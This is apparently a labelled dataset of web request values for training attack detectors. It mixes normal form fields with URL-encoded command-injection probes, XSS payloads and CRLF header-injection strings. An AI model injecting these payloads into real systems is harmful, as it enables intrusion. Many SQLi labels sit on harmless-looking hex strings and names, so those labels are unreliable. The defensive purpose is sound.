payload,label,source
2BB9D159C45A82113D913BFA1448D7E9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Passeig+De+Monjo+102,+11?A",Normal,csic_gsi:cisc_normalTraffic_train.txt
Alkos,Normal,csic_gsi:cisc_normalTraffic_test.txt
9965289480263638,Normal,csic_gsi:cisc_normalTraffic_train.txt
linero-noro@cocheacoche.uy,Normal,csic_gsi:cisc_normalTraffic_train.txt
58501A30472066FE85341907815FD9CE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7AE05C82D2CAF22FE715499E36EE8F90,Normal,csic_gsi:cisc_normalTraffic_test.txt
F72AD1413864532665134D285CDCA00A,Normal,csic_gsi:cisc_normalTraffic_test.txt
con*trabajo,Normal,csic_gsi:cisc_normalTraffic_test.txt
99C848744179DE0332926E94E37F1715,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3B%20str%3D%24%28echo%20GJNRXW%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,seclists_cmd
C6384AA40883B9342BF4BAE7D32A29FA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ACDE19905B3D321A98F7F4F59AEE56D5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Ele�zaro,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=bride&pwd=fraccIonaria&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
13421536R,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20IUGZRA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
6294799D249D7E3F78A4DA0776E224E8,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NSNYEU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%7C,CMD,seclists_cmd
A9731CB6481F6ED0B22013854CBD57C8,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20YQABCF%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20BYUJUS%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
"<META HTTP-EQUIV=""Link"" Content=""<http://xss.rocks/xss.css>; REL=stylesheet"">",XSS,fuzzdb_xss
Encinillas,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KMQXRC%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
Freddy,Normal,csic_gsi:cisc_normalTraffic_test.txt
259414DDEDAB43B653C90C7E5F966F77,Normal,csic_gsi:cisc_normalTraffic_test.txt
9435,Normal,csic_gsi:cisc_normalTraffic_train.txt
marice,Normal,csic_gsi:cisc_normalTraffic_train.txt
DFFCB423F46511C9980010791CF112DE,Normal,csic_gsi:cisc_normalTraffic_train.txt
809D640F59440D619E7C6D5AE1D488E8,Normal,csic_gsi:cisc_normalTraffic_train.txt
1%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9353,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
28010640K,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
campe6n,Normal,csic_gsi:cisc_normalTraffic_train.txt
965772FDDCA8E50D56D439AF0401FFD3,Normal,csic_gsi:cisc_normalTraffic_test.txt
6CEBA42F576FB83F69C1A499185C9696,Normal,csic_gsi:cisc_normalTraffic_train.txt
CCD7A0402B7941AD5B0328E778374BBE,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%201%20-ne%20%24%28echo%20SQHKCG%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
%27%26%20sleep%200%20%26%26%20str%3D%24%28echo%20DPWDWF%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20JHAATD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,seclists_cmd
F7C64A9DB7C09133F27745C88B4CA28C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
20F9188B765864042E015A7D5B38C06A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
005CA83C8C210B60DA2D681F2D837D8F,Normal,csic_gsi:cisc_normalTraffic_test.txt
4492CC7F75E1BC64F11D250729BA595B,Normal,csic_gsi:cisc_normalTraffic_train.txt
1CB7C3FEB780670531559C4F35101B8A,Normal,csic_gsi:cisc_normalTraffic_train.txt
D099E201EB6110DA98B4CF241CC36CD1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
77974019V,Normal,csic_gsi:cisc_normalTraffic_train.txt
62B1144D67B77954EAE79407AC740F30,Normal,csic_gsi:cisc_normalTraffic_test.txt
7061EFE5144AAFA8685A92AE9790DD0C,Normal,csic_gsi:cisc_normalTraffic_test.txt
5464FACEF15F33B216DA716D863658AF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
94C71E5335150DD3FC4077B143929030,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro<SCRIPT>alert(""Paros"");</SCRIPT>&login=widuch&password=o7TOp�dIca&nombre=Belindo&apellidos=Calet&email=gassman@itrends.gs&dni=54927886E&direccion=Memorial+Nu�ez+Blanca+193,+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar",XSS,community:payloads_seed
35CF406287EEBBA981795AC994D411F0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
56875AD4112392E2E58259F62A2C646D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%0aecho$IFSFNPDLF$((30%2B38))$(echo$IFSFNPDLF)FNPDLF&,CMD,seclists_cmd
%7C%20%5B%203%20-ne%20%24%28echo%20TKXZEX%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%252F%252F,CMD,seclists_cmd
78110125F0834937422CF088C0A01526,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=registro&login=lonald8&password=5H5c8&nombre=Ivonne&apellidos=Abarrategui+Allende&email=pap@evelin.com.ly&dni=94629114F&direccion=Haiti+27+1?G&ciudad=Hortig�ela&cp=47319&provincia=Sevilla&ntc=3123820484071721&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
28511,Normal,csic_gsi:cisc_normalTraffic_test.txt
68E43581D8D9D2F30C676B92EDEC49CF,Normal,csic_gsi:cisc_normalTraffic_test.txt
Credenciales+incorrectasany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F3B08F9FBAAD41B3BA5FC82DE7BDDAAE,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Santander+S/N,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E338A755BB13CE3781EAFAADB050ABF8,Normal,csic_gsi:cisc_normalTraffic_train.txt
ed,Normal,csic_gsi:cisc_normalTraffic_train.txt
C4789D2452B25EC75C4DB708800D0724,Normal,csic_gsi:cisc_normalTraffic_test.txt
68F4433624CFC607D616B2F43F9905BE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D9ECB9118C658E5CE6F040DB3E3DC12A,Normal,csic_gsi:cisc_normalTraffic_test.txt
6E28CFED2FBA30DB6C279BA42D16204A,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=crozier&password=aborrecimiento&nombre=Ricardina&apellidos=Burch+Echaniz&email=hyer_longdon0@artforall.mc&dni=62804007T&direccion=Plza.+Troyano+Salaverry,+42,+&ciudadA=Ch�var&cp=30500&provincia=Le�n&ntc=1229899553268508&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
34BF69E669B157B271ACD72A24C031FA,Normal,csic_gsi:cisc_normalTraffic_train.txt
38DF912B5F9032CE7351A47A46DE1090,Normal,csic_gsi:cisc_normalTraffic_test.txt
ED51D2A860EA5EDCB57215B9B2DB49BB,Normal,csic_gsi:cisc_normalTraffic_train.txt
virk,Normal,csic_gsi:cisc_normalTraffic_test.txt
${passthru(print(`echo%20EWDATZ\necho%20$((58%2B44))\necho%20EWDATZ\necho%20EWDATZ`)%3B//EWDATZ,CMD,seclists_cmd
Sant+Joan+de+les+Abadesses,Normal,csic_gsi:cisc_normalTraffic_test.txt
64D1DDF2322AA93F46E8FA27A7CEB361,Normal,csic_gsi:cisc_normalTraffic_test.txt
Bell-lloc+d'Urgell,Normal,csic_gsi:cisc_normalTraffic_test.txt
nacarig�e,Normal,csic_gsi:cisc_normalTraffic_test.txt
5FACAD02E2165377F6D023D757E6098E,Normal,csic_gsi:cisc_normalTraffic_train.txt
barlas,Normal,csic_gsi:cisc_normalTraffic_train.txt
48650,Normal,csic_gsi:cisc_normalTraffic_train.txt
'%0aecho$IFSWHMVQH$((51%2B53))$(echo$IFSWHMVQH)WHMVQH//,CMD,seclists_cmd
jada,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%7Cecho$IFSWJYCOX$((21%2B64))$(echo$IFSWJYCOX)WJYCOX%27,CMD,seclists_cmd
"Guadamacil,+198,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=evey8&password=87sacar&nombre=Faustino&apellidos=Marti+Maragliano&email=almassy@schnapps.com.vg&dni=31454031J&direccion=C/+Luis+Alvarez+Lencero,+78+8-B&ciudad=Fresno+de+Rodilla&cp=12292&provincia=Le�n&ntcA=6284462739974610&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'%7C%7Cecho%20DVAMSG$((74%2B5))$(echo%20DVAMSG)DVAMSG,CMD,seclists_cmd
id=1&nombre=Jam�n+Ib�rico&precio=100&cantidad=30&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
4C70231A36DE87437C9535199097FDAC,Normal,csic_gsi:cisc_normalTraffic_train.txt
07628F8CFFC6AA98D9D3617C301E3743,Normal,csic_gsi:cisc_normalTraffic_train.txt
4524D2DBC0D63FF9EABDE463202CD5E8,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=kang&password=3lechazo&nombre=Diodoro&apellidos=Idigoras+El+Khouri&email=gallatin.woodbridge@discon.ma&dni=57806990D&direccion=Calle+Liverpool,+122,+&ciudad=Iznalloz&cp=09227&provincia=Salamanca&ntc=3044392117548178&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%0A%20str%3D%24%28echo%20TNOFGN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
5F965A9D4EE189DC500C524680D1D888,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
36F7CD22CCCE2B9195D27F4BA8FF090B,Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Conde+Oliveto+S/N,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
26EFE1882B38F92DF4BBED2734E2F8E4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
684D7546CAED147BE3A68E0D2C8426D9,Normal,csic_gsi:cisc_normalTraffic_train.txt
Corvera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B2DAB64D8A44D52AADCA6266B14C14D9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Dinardi+Compres,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0373AC73FC88D8A672BEF176BEF510E5,Normal,csic_gsi:cisc_normalTraffic_train.txt
B9AE44F317A9959C7DFDA81B719AF14A,Normal,csic_gsi:cisc_normalTraffic_train.txt
DB9BEEB69D0F8C8E8F28E45DDB6DF62D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
quienq!uier,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0raS0ASAdora,Normal,csic_gsi:cisc_normalTraffic_test.txt
A73449F5F96DA088D29140F5FE0B3606,Normal,csic_gsi:cisc_normalTraffic_train.txt
34846,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=hendryck&password=malav4n5657&nombre=Romanela&apellidos=Canovas+Jodar&email=ziegel.beverly@kpincentives.vu&dni=03263111D&direccion=Marte+44+&ciudad=Meis&cp=10137&provincia=Burgos&ntc=7454500014712200&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
B977504A500F89DB65D0FB12927F0D6D,Normal,csic_gsi:cisc_normalTraffic_test.txt
42120,Normal,csic_gsi:cisc_normalTraffic_train.txt
Merindad+de+R�o+Ubierna,Normal,csic_gsi:cisc_normalTraffic_train.txt
8352337916705491,Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=entrar&login=dokken8&pwd=PaRLaNch�n&remember=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
terryl,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8DDC55B56CBDCC255F45EBA6E10BA60A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modoA=entrar&login=hatti&pwd=centilitro&remember=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5C19762361B5D26F4746170292F90274,Normal,csic_gsi:cisc_normalTraffic_train.txt
gursin,Normal,csic_gsi:cisc_normalTraffic_test.txt
7C9D5C5A447371B6179A04BB95541CE7,Normal,csic_gsi:cisc_normalTraffic_test.txt
7706F1B2CF9193FEC2F0975A5E506E25,Normal,csic_gsi:cisc_normalTraffic_train.txt
bouchard,Normal,csic_gsi:cisc_normalTraffic_train.txt
46630334L,Normal,csic_gsi:cisc_normalTraffic_train.txt
'echo%20WIBNDS$((23%2B85))$(echo%20WIBNDS)WIBNDS%22,CMD,seclists_cmd
id=2&nombre=Vino+Rioja&precioA=100&cantidad=86&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
vanni@sietepeines.eu,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
404F4E2CF9B8A5DDF11651B64717F302,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=teinmin&password=rebuscadora&nombre=Pastor&apellidos=Iglesia+Forns&email=chase@deltamarina.tk&dni=85681367L&direccion=Calle+Arguelles,+58,+11?C&ciudad=Mas�,+La&cp=32794&provincia=Le�n&ntc=8425506707479481&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
D05C330DCD0D4D69BF924CD2AA4B662C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26echo%20NFZBSQ$((53%2B70))$(echo%20NFZBSQ)NFZBSQ\,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20DVDULN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
89910635R,Normal,csic_gsi:cisc_normalTraffic_train.txt
90C46C076CB2E8AA65064CC4025E7A88,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
384C60276D2FA28771BA62CE73E3CFE6,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26echo%20CFMBIF$((28%2B65))$(echo%20CFMBIF)CFMBIF&,CMD,seclists_cmd
'%3Becho$IFSGKNHWZ$((67%2B92))$(echo$IFSGKNHWZ)GKNHWZ%22,CMD,seclists_cmd
CB9A6B4D30D129F64CDC65A103A3DA3B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
23109356Z,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20YCZVOO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
Ratera,Normal,csic_gsi:cisc_normalTraffic_test.txt
Lliset+Gros,Normal,csic_gsi:cisc_normalTraffic_test.txt
';echo%20CYLOAT$((50%2B30))$(echo%20CYLOAT)CYLOAT%7C,CMD,seclists_cmd
16B6ADAF30F991A86295E279AA21117D,Normal,csic_gsi:cisc_normalTraffic_train.txt
3872,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%206%20-ne%20%24%28echo%20PARKLW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,seclists_cmd
"C/+Poeta+Muhammad+Iqbal,+9+10G",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
)print(`echo%20NLOFKT\necho%20$((26%2B86))\necho%20NLOFKT\necho%20NLOFKT`)%3B%2525255C%2525255CNLOFKT,CMD,seclists_cmd
modo=entrar&login=justinia&pwd=moNtA��s&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
patay,Normal,csic_gsi:cisc_normalTraffic_train.txt
)print(`echo%20GGCMZV`.`echo%20$((6%2B53))`.`echo%20GGCMZV`.`echo%20GGCMZV`)%29%7DGGCMZV,CMD,seclists_cmd
San+Vicente+de+la+Barquera,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%26echo%20LSCMRZ$((76%2B36))$(echo%20LSCMRZ)LSCMRZ|,CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ZEPVFU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
9FC9A250DEEB30FF6A9085B7BCE9C09D,Normal,csic_gsi:cisc_normalTraffic_test.txt
preston,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Vino+Rioja&precio=100&cantidad=26paros%22%20style=%22background:url(javascript:alert('Paros'))&B1=A�adir+al+carrito,XSS,csic_gsi:cisc_anomalousTraffic_test.txt
08584FFFD91E4BF457891456FFE75641,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
014D9DB6BF9593ADFF059D4C9653B790,Normal,csic_gsi:cisc_normalTraffic_train.txt
801A25FEB3670F55110B8871FE7992FE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VAVICY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%206%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%257C,CMD,seclists_cmd
13FBD2B4280EA051207E00015EBEAC82,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2e720lOn7r,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%20echo%20WBRAYT$((68%2B32))$(echo%20WBRAYT)WBRAYT%27,CMD,seclists_cmd
C44B7AEEF15EE128FB6AECB0E2586284,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%3B%20str%3D%24%28echo%20PUPQPK%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
B48D69A7C37B07EFA7250BD1FE4051E3,Normal,csic_gsi:cisc_normalTraffic_train.txt
F3A7F22BBAEFB4F10EFF6DAB2E7BA908,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AD2A7C2AA05C40A051B85BA4473F2812,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
08189,Normal,csic_gsi:cisc_normalTraffic_test.txt
B79BE9E91BC477A82E195CEAFB2C573A,Normal,csic_gsi:cisc_normalTraffic_train.txt
6A2C6FD480CA314EE145ECFD656D316E,Normal,csic_gsi:cisc_normalTraffic_train.txt
6EA961D9112D25B8DAEA3890B1BE4F24,Normal,csic_gsi:cisc_normalTraffic_test.txt
4866928CE4D7E996D9691B5EDD6E4EC8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
34A31A6750CC4785B8E17A2CF46977AA,Normal,csic_gsi:cisc_normalTraffic_train.txt
137C4635C6E9CCF20CD037538194F1EE,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26echo$IFSNPBSWH$((19%2B90))$(echo$IFSNPBSWH)NPBSWH%27,CMD,seclists_cmd
23865566F,Normal,csic_gsi:cisc_normalTraffic_train.txt
49F7A182F9C6DC79B9DF7D62321D5702,Normal,csic_gsi:cisc_normalTraffic_train.txt
80CC4D1192B76E6AD57E6936850345EE,Normal,csic_gsi:cisc_normalTraffic_train.txt
6B6700CD88ACDE13752D9E5A2A955DE2,Normal,csic_gsi:cisc_normalTraffic_test.txt
"%7Cecho$IFSATHGRY$((94%2B45))$(echo$IFSATHGRY)ATHGRY""",CMD,seclists_cmd
Me.din?a+de+Rioseco,SQLi,community:payloads_seed
Argecilla,Normal,csic_gsi:cisc_normalTraffic_train.txt
9C76B7E6DB906BBDBD9330F704B1AAB0,Normal,csic_gsi:cisc_normalTraffic_test.txt
D94086077E5D1E4F600771C0A5A89CA3,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=sykes&password=k�fir&nombre=Marciana&apellidos=De+Jaime&email=navratil@sindns.as&dni=66866648J&direccion=Zapata,+S/N+&ciudad=Lladurs&cp=43893&provincia=Navarra&ntc=0057204714004346&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
D592B523D1A6841225F47D42B62AE78F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C13E2EA7F910C89B1208558D861022A3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
448CCD31A962C6B95E2C8330537BA1F3,Normal,csic_gsi:cisc_normalTraffic_train.txt
5697798344516062,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20FXPFKU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
3CFC8E020478EDEC711F242307834C46,Normal,csic_gsi:cisc_normalTraffic_test.txt
21E09EDEF8C4117C37914DB3DB5A210C,Normal,csic_gsi:cisc_normalTraffic_test.txt
108DA5134D0BF47219F00518FD1BD28C,Normal,csic_gsi:cisc_normalTraffic_train.txt
rutilant+e,Normal,csic_gsi:cisc_normalTraffic_train.txt
04742,Normal,csic_gsi:cisc_normalTraffic_train.txt
87CAF735D2986353BD6FF2051A5F8D5F,Normal,csic_gsi:cisc_normalTraffic_train.txt
4373,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B5B2EC4A9999F59D775F445D8FBB72C9,Normal,csic_gsi:cisc_normalTraffic_train.txt
369B7AB5D2DD54A90279A1ACCC8EC1C5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
TaPaCAMiNO,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
644E31E21943C6CBE194CF183B34A7B7,Normal,csic_gsi:cisc_normalTraffic_train.txt
90any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
